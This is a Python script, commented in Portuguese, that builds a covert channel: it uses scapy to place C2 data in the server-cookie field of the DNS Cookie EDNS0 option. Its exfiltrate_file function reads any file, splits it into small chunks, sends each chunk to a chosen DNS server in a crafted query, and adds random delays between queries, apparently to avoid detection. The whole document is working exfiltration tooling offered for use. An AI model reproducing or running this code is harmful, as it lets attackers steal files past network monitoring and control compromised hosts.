#!/usr/bin/env python3
"""
T3: Cookie Covert Channel
RFC 7873 - DNS Cookie (code 10)
Client cookie: 8 bytes (fixo)
Server cookie: 8-32 bytes (opaco, controlado pelo servidor)
"""

import struct
import time
import random
import os

from scapy.all import IP, UDP, send, RandShort
from scapy.layers.dns import DNS, DNSQR, DNSRROPT, EDNS0TLV

COOKIE_OPT_CODE = 10  # RFC 7873


def encode_data(c2_data: bytes,
                client_cookie: bytes = None) -> EDNS0TLV:
    """Codificar dados C2 no campo Server Cookie"""
    if client_cookie is None:
        client_cookie = os.urandom(8)

    # Client cookie (8 bytes) + Server cookie (8-32 bytes com dados C2)
    cookie_data = client_cookie[:8] + c2_data[:32]

    return EDNS0TLV(
        optcode=COOKIE_OPT_CODE,
        optlen=len(cookie_data),
        optdata=cookie_data
    )


def decode_data(tlv: EDNS0TLV) -> dict:
    """Decodificar dados do cookie"""
    if tlv.optcode == COOKIE_OPT_CODE and len(tlv.optdata) > 8:
        return {
            'client_cookie': tlv.optdata[:8],
            'c2_data': tlv.optdata[8:]
        }
    return {}


def build_query(domain: str, payload: bytes,
                dns_server: str, client_cookie: bytes = None,
                buf_size: int = 4096):
    """Construir query DNS com dados no cookie"""
    edns0_opt = encode_data(payload, client_cookie)

    pkt = (
        IP(dst=dns_server) /
        UDP(dport=53, sport=RandShort()) /
        DNS(
            rd=1,
            qd=DNSQR(qname=domain, qtype='A'),
            ar=DNSRROPT(
                rclass=buf_size,
                rdata=[edns0_opt]
            )
        )
    )
    return pkt


def exfiltrate_file(filepath: str, domain: str,
                    dns_server: str):
    """Exfiltrar arquivo via T3 (24 bytes por query no server cookie)"""
    with open(filepath, 'rb') as f:
        data = f.read()

    chunk_size = 24  # Max server cookie payload
    total_chunks = (len(data) + chunk_size - 1) // chunk_size

    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]

        header = struct.pack('!HH', i // chunk_size, total_chunks)
        payload = header + chunk

        subdomain = f"c{i // chunk_size}.{domain}"
        pkt = build_query(subdomain, payload, dns_server)
        send(pkt, verbose=0)

        time.sleep(random.uniform(0.2, 1.0))

    print(f"[T3] Exfiltrado: {filepath} ({len(data)} bytes, "
          f"{total_chunks} chunks)")
